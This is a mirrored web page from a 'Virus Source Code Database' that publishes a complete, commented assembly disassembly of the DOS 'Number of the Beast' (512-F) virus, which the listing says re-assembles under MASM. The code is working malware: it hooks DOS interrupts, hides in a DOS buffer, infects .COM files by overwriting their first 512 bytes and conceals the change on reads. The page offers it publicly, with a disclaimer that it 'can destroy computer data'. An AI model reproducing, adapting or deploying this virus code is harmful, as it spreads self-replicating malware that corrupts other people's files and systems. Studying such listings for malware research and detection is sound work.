<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: 512_f_asm</title>
<meta name="KEYWORDS" content="512_f.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for 512_f.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="1000year_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1000year_asm.php">1000year_asm</a><br><a href="102_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/102_asm.php">102_asm</a><br><a href="1260__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260__asm.php">1260__asm</a><br><a href="1260_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1260_asm.php">1260_asm</a><br><a href="133_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/133_asm.php">133_asm</a><br><a href="134_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/134_asm.php">134_asm</a><br><a href="1575_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_asm.php">1575_asm</a><br><a href="1575_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575_e_asm.php">1575_e_asm</a><br><a href="1575-org_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1575-org_asm.php">1575-org_asm</a><br><a href="1701_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1701_asm.php">1701_asm</a><br><a href="1704__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704__asm.php">1704__asm</a><br><a href="1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1704_asm.php">1704_asm</a><br><a href="1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1808_asm.php">1808_asm</a><br><a href="1888_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1888_asm.php">1888_asm</a><br><a href="1963_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1963_asm.php">1963_asm</a><br><a href="196_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/196_asm.php">196_asm</a><br><a href="1992_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1992_asm.php">1992_asm</a><br><a href="1ststar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1ststar_asm.php">1ststar_asm</a><br><a href="1stvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/1stvirus_asm.php">1stvirus_asm</a><br><a href="203_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/203_asm.php">203_asm</a><br><a href="2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2249_asm.php">2249_asm</a><br><a href="2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2350_asm.php">2350_asm</a><br><a href="2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2400_asm.php">2400_asm</a><br><a href="2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2471_asm.php">2471_asm</a><br><a href="2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2501_asm.php">2501_asm</a><br><a href="2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2564_asm.php">2564_asm</a><br><a href="2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2626_asm.php">2626_asm</a><br><a href="2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/2715_asm.php">2715_asm</a><br><a href="29bytes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/29bytes_asm.php">29bytes_asm</a><br><a href="3066_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/3066_asm.php">3066_asm</a><br><a href="30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/30_asm.php">30_asm</a><br><a href="334_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334_b_asm.php">334_b_asm</a><br><a href="334-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/334-b_asm.php">334-b_asm</a><br><a href="382_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/382_asm.php">382_asm</a><br><a href="405_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_a_asm.php">405_a_asm</a><br><a href="405__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405__asm.php">405__asm</a><br><a href="405_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_asm.php">405_asm</a><br><a href="405_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/405_b_asm.php">405_b_asm</a><br><a href="4096a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096a_asm.php">4096a_asm</a><br><a href="4096____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096____asm.php">4096____asm</a><br><a href="4096___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096___asm.php">4096___asm</a><br><a href="4096__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096__asm.php">4096__asm</a><br><a href="4096_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/4096_asm.php">4096_asm</a><br><a href="42bites_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/42bites_asm.php">42bites_asm</a><br><a href="44__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44__asm.php">44__asm</a><br><a href="44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/44_asm.php">44_asm</a><br><a href="45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/45_asm.php">45_asm</a><br><a href="500_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/500_asm.php">500_asm</a><br><a href="5120_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/5120_asm.php">5120_asm</a><br><a href="512__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512__asm.php">512__asm</a><br><a href="512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_asm.php">512_asm</a><br><a href="512_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_e_asm.php">512_e_asm</a><br><a href="512-e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-e_asm.php">512-e_asm</a><br><a href="512_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512_f_asm.php">512_f_asm</a><br><a href="512-f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/512-f_asm.php">512-f_asm</a><br><a href="534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/534_asm.php">534_asm</a><br><a href="541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541__asm.php">541__asm</a><br><a href="541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/541_asm.php">541_asm</a><br><a href="560_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/560_asm.php">560_asm</a><br><a href="578_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/578_asm.php">578_asm</a><br><a href="583_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583_asm.php">583_asm</a><br><a href="583virus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/583virus_asm.php">583virus_asm</a><br><a href="648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/648_asm.php">648_asm</a><br><a href="7son_284_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_284_asm.php">7son_284_asm</a><br><a href="7son_332_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son_332_asm.php">7son_332_asm</a><br><a href="7son426b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son426b_asm.php">7son426b_asm</a><br><a href="7son-473_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son-473_asm.php">7son-473_asm</a><br><a href="7son473b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7son473b_asm.php">7son473b_asm</a><br><a href="7th_son4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son4_asm.php">7th_son4_asm</a><br><a href="7th_son__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/7th_son__asm.php">7th_son__asm</a><br><a href="808__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808__asm.php">808__asm</a><br><a href="808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/808_asm.php">808_asm</a><br><a href="80hex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/80hex_asm.php">80hex_asm</a><br><a href="90210_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/90210_asm.php">90210_asm</a><br></td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/a/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/a/index.php'" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/b/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/b/index.php'" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/c/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/c/index.php'" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/d/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/d/index.php'" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/e/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/e/index.php'" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/f/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/f/index.php'" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/h/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/h/index.php'" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/i/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/i/index.php'" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/j/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/j/index.php'" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/k/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/k/index.php'" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/l/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/l/index.php'" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/m/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/m/index.php'" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/index.php'" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/o/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/o/index.php'" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/p/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/p/index.php'" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/q/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/q/index.php'" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/s/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/s/index.php'" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/t/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/t/index.php'" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/u/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/u/index.php'" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/w/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/w/index.php'" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/x/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/x/index.php'" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/y/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/y/index.php'" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

	name	V512F
	title	V512F - The 'Number of the Beast' Virus
	subttl	(Version F - a slight mutation of the original one)
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", ap. 51        บ
; บ  Telephone: Private: (+35-92) 58-62-61, Office: (+35-92) 71-401 ext. 255 บ
; บ									     บ
; บ		     The 'Number of the Beast' Virus, version F              บ
; บ		   Disassembled by Vesselin Bontchev, April 1990	     บ
; บ									     บ
; บ		     Copyright (c) Vesselin Bontchev 1989, 1990 	     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code,ds:code,es:code

	org	100

start:
	mov	ah,30		; Get DOS version
	int	21

	mov	si,4		; Point DS at interrupt vectors
	mov	ds,si

	cmp	ah,1E		; Minor version >= 30?
	lds	ax,[si+8]	; Get INT 13h vector in DS:AX
	jb	low_ver 	; That's all if minor DOS version < 30

	mov	ah,13		; Get original INT 13h vector in DS:DX
	int	2F
	push	ds		; Save it
	push	dx
	int	2F		; Call INT 2F again to restore DS & DX
	pop	ax		; Restore original INT 13h
	pop	ds		;  vector in DS:DX

low_ver:
	mov	di,0F8		; Now INT 13h vector is in DS:DX
	stosw			; Save it at PSP:0F8
	mov	ax,ds
	stosw

	mov	ds,si		; Now get INT 21h vector in DS:AX
	lds	ax,[si+40]
	stosw			; And store it at PSP:0FC
	cmp	ax,(new_int_21 - start) + 8	; Virus in memory?
	mov	ax,ds
	stosw			; By the way, now DI == 100h

	push	es		; Now RETF will jump to PSP:100h,
	push	di		;  i.e. to start
	jne	skip1		; Virus not present. Go to installation

	shl	si,1		; Second check for virus in memory. SI := 8
	mov	cx,(endaddr-start)/2	; Compare the virus code with DS:8
	rep	cmpsw		;  (100h words)
skip1:
	push	cs		; Restore DS := CS
	pop	ds
	je	run		; Virus found. Run the original program

; Virus not found in memory. Install it there. The memory check is not
; quite correct. Since the virus does not try to be the fist program
; which intercepts INT 21h, it is possible that it is already present
; in memory, but another program (a TSR one) has changed the INT 21h
; vector. This will cause the reloading of the virus and another buffer
; will "disapear". If there is no more buffers, the machine may hang.

	mov	ah,52		; Get list of lists in ES:BX
	int	21

	push	es		; Save list's segment
	mov	si,0F8		; Prepare for move. Offset of source address.
	sub	di,di		; Offset of destination address (0)
	les	ax,es:[bx+12]	; Point ES:AX at first DOS buffer

; Point DX at next DOS buffer. And what if there is no more buffers?

	mov	dx,es:[di+2]

; Copy the saved original interrupt vectors plus
; the virus body in the 1st DOS buffer:

	mov	cx,(endaddr-start+8)/2
	rep	movsw

	mov	ds,cx		; Install ES:121 (new_int_21)
	mov	di,16		;  as new INT 21h handler
	mov	word ptr [di+21*4-16],(new_int_21 - start) + 8
	mov	[di+21*4-16+2],es

	pop	ds		; Point DS at the list of lists' segment

; "Hide" the virus (now in the first DOS buffer) by excluding this
; buffer from the DOS buffer chain. To do so, just set the
; first buffer pointer to point at the next buffer of the chain.
; (DX already points at the next DOS I/O buffer.)

	mov	[bx+14],dx

	mov	dx,cs		; DX := current PSP
	mov	ds,dx		; Restore DS == CS

	mov	bx,[di+2-16]	; Point BX at high memory
	dec	bh

; The second byte of the instruction above is 0CFh == IRET

new_int_24	equ	$-1

	mov	es,bx		; Point ES at the last 4 Kbytes of memory

; If the current PSP is less than the previous one, then
; IBMDOS.COM is just loading the command interpretter
; and the current PSP belongs to the latter.

	cmp	dx,[di]

; Get command interpretter's full name in DS:16h

	mov	ds,[di]
	mov	dx,[di]
	dec	dx
	mov	ds,dx

	mov	si,cx		; SI := 0
	mov	dx,di		; DX := 16h (DI == 16h)
	mov	cl,28		; Copy name to higher memory (eventualy
	rep	movsw		;  destroys COMMAND.COM's transient part)

	mov	ds,bx
	jb	boot		; Run command interpretter at boot time

	int	20		; Program terminate

run:
	mov	si,cx		; SI := 0
	mov	ds,[si+2C]	; Get environment address
srch_lp:
	lodsw			; Search the end of the environment
	dec	si
	test	ax,ax
	jnz	srch_lp

	add	si,3		; Get program's name (argv [0]) in DX
	mov	dx,si
boot:
	mov	ah,3Dh		; Open file
	call	dos_call

	mov	dx,[di] 	; DX := file size
	mov	[di+4],dx	; Position at the end of file
	add	[di],cx 	; Add 512 bytes to file size

	pop	dx
	push	dx		; DX := 100h (offset start)

	push	cs		; ES := DS := CS
	pop	ds
	push	ds
	pop	es

	push	es
	mov	al,50		; AH is 0 (from dos_call)
	push	ax

; Now RETF will jump to PSP:50h. There are the instructions INT 21h; RETF there.
; Thus, this will execute the next DOS function call, then jump to PSP:100h.

	mov	ah,3F		; Read from file handle
	retf			; (the first 512 bytes into PSP:100h)

dos_call:
	int	21		; Invoke DOS function call
	jc	dos_ret 	; Exit on error
	mov	bx,ax		; Save the file handle in BX
point:
	push	bx		; Save BX
	mov	ax,1220 	; Get system file table entry No. for
	int	2F		;  file the handle in BX into ES:DI

	mov	bl,es:[di]
	mov	ax,1216 	; Get system FCB for file table entry
	int	2F		;  No. in BX into ES:DI
	pop	bx		; Restore BX

	push	es
	pop	ds		; DS := ES

	add	di,11		; Point ES:DI & DS:DI at file size
	mov	cx,512d 	; CX := 512
dos_ret:
	ret			; Done. Exit

read:				; READ function handler
	sti			; Enable interrupts
	call	point		; Point ES:DI at file's internal FCB

	mov	bp,cx		; BP := 512
	mov	si,[di+4]	; Point SI at file position
	pop	cx		; Restore CX & DS
	pop	ds
	call	do_read 	; Read from file handle
	jc	int_21_xit1	; Exit on error

	cmp	si,bp		; Is file position < 512?
	jnb	int_21_xit1	; Exit if not

	push	ax		; Save AX
	mov	al,es:[di-4]	; Get file time
	not	al
	and	al,1F		; Seconds == 62?
	jnz	int_21_xit	; Exit if not

	add	si,es:[di]	; Compute offset at original code
	xchg	si,es:[di+4]	; Swap position (correct)
	add	es:[di],bp	; Correct file size (+512)
	call	do_read 	; Read from file handle
	mov	es:[di+4],si	; Restore original position
	lahf			; Save flags
	sub	es:[di],bp	; Restore original file size (-512)
	sahf			; Restore flags
int_21_xit:
	pop	ax		; Restore AX
int_21_xit1:
	pop	bp		; Restore saved registers
	pop	di
	pop	si
	pop	es
	retf	2		; Return error code in flags

do_read:
	mov	ah,3F		; READ from file using handle
do_dos:
	pushf
	push	cs		; Prepare for IRET
	call	orig_21
	ret

new_int_21:
	push	es		; Save registers used
	push	si
	push	di
	push	bp
	push	ds
	push	cx

	cmp	ah,3F		; Is it a READ function call?
	je	read		; Do it if so

	push	ax		; Save some more registers
	push	bx
	push	dx

	cmp	ah,3E		; Is it a CLOSE function call?
	je	close		; Do it if so
	cmp	ax,4B00 	; Is it an EXEC function call?
	mov	ah,3Dh		; Convert it to OPEN if so
	je	exec		; And execute it
dos_xit:
	pop	dx		; Neither READ, nor CLOSE, nor EXEC.
	pop	bx		; Restore registers and exit
	pop	ax
	pop	cx
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	es
orig_21:			; Exit trough the original INT 21h handler
	jmp	dword ptr cs:[4]

close:				; CLOSE function handler
	mov	ah,45		; First duplicate the handle
exec:				; EXEC function handler
	call	dos_call
	jc	dos_xit 	; Exit on error

	sub	ax,ax		; AX := 0
	mov	[di+4],ax	; Seek to file beginning
	mov	byte ptr [di-0F],10b	; Set access rights to writable

	cld			; Clear direction flag
	mov	ds,ax
	mov	si,13*4 	; Save INT 13h vector on stack
	lodsw
	push	ax
	lodsw
	push	ax

	push	[si+24*4-(13*4+4)]	; Save INT 24h vector on stack
	push	[si+24*4-(13*4+4)+2]

	lds	dx,cs:[si-(13*4+4)]	; Set INT 13h to saved vector
	mov	ax,2513 	; Set interrupt vector
	int	21

	push	cs
	pop	ds		; DS := CS
	mov	dx,(new_int_24 - start) + 8
	mov	al,24		; Set INT 24h (critical error handler) to IRET
	int	21		; Set interrupt vector

	push	es
	pop	ds		; DS := ES
	mov	al,[di-4]	; Get file time
	and	al,1F		;  (the seconds more exactly)
	cmp	al,1F		; File infected?
	je	skip2		; Skip the following code if so

	mov	ax,[di+17]	; Get file extension
	sub	ax,'OC'         ; '*.CO?' file?
	jne	go_close	; Exit if not
skip2:
	xor	[di-4],al	; Zero file seconds
	mov	ax,[di] 	; Get file size
	cmp	ax,cx		; Is file size < 512?
	jb	go_close	; Don't infect if so
	add	ax,cx
	jc	go_close	; Don't infect if file size + 512 > 64 K

	test	byte ptr [di-0Dh],100b	; Test System attribute
	jnz	go_close	; Exit if ON

	lds	si,[di-0A]	; Get device driver pointer
	cmp	[si+4],ch	; See if at least 3 sectors/cluster (CH == 02h)
	jb	skip3
	dec	ax
	shr	ah,1		; AH := number of last sector after infection
	and	ah,[si+4]	; Get sector's number in the cluster
	jz	go_close	; Exit if does not fit

skip3:
	mov	ax,20
	mov	ds,ax		; Read 512 bytes using file handle
	sub	dx,dx		;  into 0000:0200h
	call	do_read 	; Do it

	mov	si,dx		; SI := 512 (DX == 512)
	push	cx		; Save CX (CX == 512)
v_srch:
	lodsb
	cmp	al,cs:[si+7]	; See if virus present in file
	jne	infect		; Infect file if not
	loop	v_srch
	pop	cx		; Restore CX
exit1:
	or	byte ptr es:[di-4],1F	; Set file time seconds to 62
exit2:
	or	byte ptr es:[di-0Bh],40 ; Set 'file modified' bit
go_close:
	mov	ah,3E		; Close file
	call	do_dos		; Execute the function

	or	byte ptr es:[di-0C],40	; ??? Flag ???

	pop	ds		; Restore INT 24h vector from stack
	pop	dx
	mov	ax,2524
	int	21		; Set interrupt vector

	pop	ds		; Restore INT 13h vector form stack
	pop	dx
	mov	al,13		; AH still equals 25h
	int	21		; Set interrupt vector
	jmp	dos_xit 	; Exit

infect:
	pop	cx
	mov	si,es:[di]	; Get file size
	mov	es:[di+4],si	; Seek at end of file

	mov	ah,40		; Write to file (the original bytes)
	int	21
	jc	exit2		; Exit on error

	mov	es:[di],si	; Restore original file size
	mov	es:[di+4],dx	; Position at file beginning

	push	cs
	pop	ds		; DS := CS

	mov	dl,8		; Write virus code (at DS:8) onto
	mov	ah,40		;  the file beginning
	int	21
	jmp	exit1		; And exit

cpright db	'666'           ; Author's signature (the devil's number)

endaddr equ	$

code	ends
	end	start

</textarea></td></tr></table></body></html>
